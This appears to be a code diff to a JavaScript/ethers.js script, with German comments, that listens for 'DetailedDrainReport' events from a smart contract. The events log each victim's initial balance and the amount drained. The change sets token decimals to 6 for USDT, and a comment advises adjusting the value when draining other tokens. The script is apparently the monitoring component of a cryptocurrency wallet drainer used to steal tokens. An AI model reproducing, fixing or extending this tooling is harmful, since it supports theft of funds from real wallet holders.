@@ -86,7 +86,7 @@ contract.on("DetailedDrainReport", async (victim, initialBalance, amountDrained,
     
     // Wandle die BigNumber-Werte in lesbare Strings um.
     // WICHTIG: Passe die Dezimalstellen an, wenn du andere Tokens drainst!
-    const decimals = 18; // Die meisten Tokens haben 18 Dezimalstellen. Für USDT z.B. auf 6 ändern.
+    const decimals = 6; // Die meisten Tokens haben 18 Dezimalstellen. Für USDT z.B. auf 6 ändern.
     const readableInitialBalance = ethers.utils.formatUnits(initialBalance, decimals);
     const readableAmountDrained = ethers.utils.formatUnits(amountDrained, decimals);
 
